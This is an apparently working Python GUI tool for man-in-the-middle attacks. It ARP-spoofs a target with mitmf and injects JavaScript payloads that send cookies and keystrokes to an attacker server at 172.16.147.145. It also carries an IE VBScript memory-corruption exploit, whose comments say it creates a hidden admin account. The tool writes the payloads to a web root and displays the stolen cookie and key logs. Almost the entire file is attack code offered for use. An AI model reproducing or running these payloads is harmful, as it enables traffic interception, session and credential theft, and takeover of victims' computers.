#coding=utf-8
from Tkinter import *
import time
import os
import threading
import subprocess
test=r'''
alert("You are hacked!");
'''
cookie=r'''
document.write('<img src="http://172.16.147.145:81/getinfo.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');
'''
keylog=r'''

var keys=''; //储存键盘鼠标记录

var hacker = 'http://172.16.147.145:81/getinfo.php';

var Url = window.location;

var Domain = document.domain;

var Cookie = document.cookie;

document.onkeypress = function(e) { //劫持键盘消息

get = window.event ? event:e;

key = get.keyCode ? get.keyCode : get.charCode;

switch(key){

case 32 : key = '[Space]';break;

case 13 : key = '[Enter]';break;

case 8 : key = '[BackSpace]';break;

default :

key = String.fromCharCode(key);

keys += key;
}
}
document.onmousedown = function(e) {
get = window.event ? event : e; //创建事件对象
var mousekey = get.button; //获取鼠标键代码
switch(mousekey) {//1 鼠标左键 2 鼠标右键 4 滚动键
case 1 :
mousekey = '[Left Mouse Clik]';break;
case 2 :
mousekey = '[Right Mouse Clik]';break;
case 4 :
mousekey = '[Roll Mouse Clik]';break;
default :
mousekey = '[Unknown Mouse Key]';
}
keys += mousekey;
}
function SendData(src){
new Image().src = src; //建立图片对象用于发射数据
}
setInterval(function(){ SendData(hacker + '?key=' + keys);keys = ''; },5000);
'''
iehtml=r'''
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />

<!--[if !IE]><!--> 本网站目前只支持IE，请使用IE打开本页面 <!--<![endif]--><br>
<!--[if IE]> 对不起，你没有权限打开本页面，请联系管理员 <![endif]-->


<!--#####漏洞利用的前提：使用IE、未打漏洞的、未开360的############################################-->
<!--#####用IE打开该页面后，电脑将会新建一个admin的用户，密码也是admin,并将IP发给自己的服务器######-->
<!--#####创建隐藏帐号请参考http://www.vfocus.net/art/20090420/4976.html###########################-->
<!--#####################          make by Anders          #######################################-->



<!doctype html>
<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<head>
</head>
<body>

<SCRIPT LANGUAGE="VBScript">

function runmumaa()
On Error Resume Next
set shell=createobject("Shell.Application")
shell.ShellExecute "calc.exe"
end function

</script>

<SCRIPT LANGUAGE="VBScript">

dim   aa()
dim   ab()
dim   a0
dim   a1
dim   a2
dim   a3
dim   win9x
dim   intVersion
dim   rnda
dim   funclass
dim   myarray

Begin()

function Begin()
  On Error Resume Next
  info=Navigator.UserAgent

  if(instr(info,"Win64")>0)   then
     exit   function
  end if

  if (instr(info,"MSIE")>0)   then
             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
  else
     exit   function

  end if

  win9x=0

  BeginInit()
  If Create()=True Then
     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)

     if(intVersion<4) then
         document.write("<br> IE")
         document.write(intVersion)
         runshellcode()
     else
          setnotsafemode()
     end if
  end if
end function

function BeginInit()
   Randomize()
   redim aa(5)
   redim ab(5)
   a0=13+17*rnd(6)
   a3=7+3*rnd(5)
end function

function Create()
  On Error Resume Next
  dim i
  Create=False
  For i = 0 To 400
    If Over()=True Then
    '   document.write(i)
       Create=True
       Exit For
    End If
  Next
end function

sub testaa()
end sub

function mydata()
    On Error Resume Next
     i=testaa
     i=null
     redim  Preserve aa(a2)

     ab(0)=0
     aa(a1)=i
     ab(0)=6.36598737437801E-314

     aa(a1+2)=myarray
     ab(2)=1.74088534731324E-310
     mydata=aa(a1)
     redim  Preserve aa(a0)
end function


function setnotsafemode()
    On Error Resume Next
    i=mydata()
    i=readmemo(i+8)
    i=readmemo(i+16)
    j=readmemo(i+&h134)
    for k=0 to &h60 step 4
        j=readmemo(i+&h120+k)
        if(j=14) then
              j=0
              redim  Preserve aa(a2)
     aa(a1+2)(i+&h11c+k)=ab(4)
              redim  Preserve aa(a0)

     j=0
              j=readmemo(i+&h120+k)

               Exit for
           end if

    next
    ab(2)=1.69759663316747E-313
    runmumaa()
end function

function Over()
    On Error Resume Next
    dim type1,type2,type3
    Over=False
    a0=a0+a3
    a1=a0+2
    a2=a0+&h8000000

    redim  Preserve aa(a0)
    redim   ab(a0)

    redim  Preserve aa(a2)

    type1=1
    ab(0)=1.123456789012345678901234567890
    aa(a0)=10

    If(IsObject(aa(a1-1)) = False) Then
       if(intVersion<4) then
           mem=cint(a0+1)*16
           j=vartype(aa(a1-1))
           if((j=mem+4) or (j*8=mem+8)) then
              if(vartype(aa(a1-1))<>0)  Then
                 If(IsObject(aa(a1)) = False ) Then
                   type1=VarType(aa(a1))
                 end if
              end if
           else
             redim  Preserve aa(a0)
             exit  function

           end if
        else
           if(vartype(aa(a1-1))<>0)  Then
              If(IsObject(aa(a1)) = False ) Then
                  type1=VarType(aa(a1))
              end if
            end if
        end if
    end if


    If(type1=&h2f66) Then
          Over=True
    End If
    If(type1=&hB9AD) Then
          Over=True
          win9x=1
    End If

    redim  Preserve aa(a0)

end function

function ReadMemo(add)
    On Error Resume Next
    redim  Preserve aa(a2)

    ab(0)=0
    aa(a1)=add+4
    ab(0)=1.69759663316747E-313
    ReadMemo=lenb(aa(a1))

    ab(0)=0

    redim  Preserve aa(a0)
end function

</script>

</body>
</html>
'''
order=r'''
mitmf -i eth0 --spoof --arp --gateway 172.16.147.2 --target 172.16.147.147 --inject --js-url http://172.16.147.145:81/test.js --hsts --html-url http://172.16.147.145:81/crack.html
'''
def generate(v):
	if v==1:
		fp=open("/var/www/html/test.js","w")
		fp.write(test)
		fp.close()
	if v==2:
		fp=open("/var/www/html/test.js","w")
		fp.write(cookie)
		fp.close()
	if v==3:
		fp=open("/var/www/html/test.js","w")
		fp.write(keylog)
		fp.close()
	if v==4:
		fp=open("/var/www/html/crack.html","w")
		fp.write(iehtml)
		fp.close()
def re_log(path):
	f=open('/var/www/html/'+path,"r")
	t.delete(0.0, END)
	line =f.readlines()
	for l in line:
		t.insert(CURRENT,l)
def t_cr():
	popen = subprocess.Popen(order, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
def crack(v):
	if v==4:
		pass
	elif v!=1:
		# (status, output) = commands.getstatusoutput('order')
		# print status,output
		threading.Thread(target=t_cr, name='thread-').start()
	else:
		threading.Thread(target=os.popen(order), name='thread-').start()
def update(v):
	if v==2:
		re_log("cookie.txt")
	if v==3:
		re_log("key.txt")
root=Tk();
root.title("MITM Attack")
root.geometry("300x500")
root.resizable(width=True, height=False)
Label(root,text="注入脚本",font=("宋体",18)).grid(row=0,stick=W)
Label(root,text="—————",font=("宋体")).grid(row=1,stick=W)
v = IntVar()
Radiobutton(root, text="测试脚本", variable=v, value=1).grid(row=2,column=0,stick=W)
Radiobutton(root, text="获取Cookie", variable=v, value=2).grid(row=2,column=1,stick=W)
Radiobutton(root, text="键盘记录", variable=v, value=3).grid(row=3,column=0,stick=W)
Radiobutton(root, text="IE漏洞", variable=v, value=4).grid(row=3,column=1,stick=W)
Label(root,text="—————",font=("宋体")).grid(row=4,stick=W)

Button(root,text="生成脚本",fg="red", command=lambda:generate(v.get())).grid(row=5,column=0,stick=W)
Button(root,text="开始攻击",fg="red", command=lambda:crack(v.get())).grid(row=5,column=1,stick=W)
Label(root,text="—————",font=("宋体")).grid(row=6,stick=W)
Label(root,text="记录",font=("宋体")).grid(row=7)
Button(root,text="更新",fg="red", command=lambda:update(v.get())).grid(row=7,column=1,stick=W)
t=Text(root,width=40)
t.grid(row=9,columnspan=2,column=0)

root.mainloop()
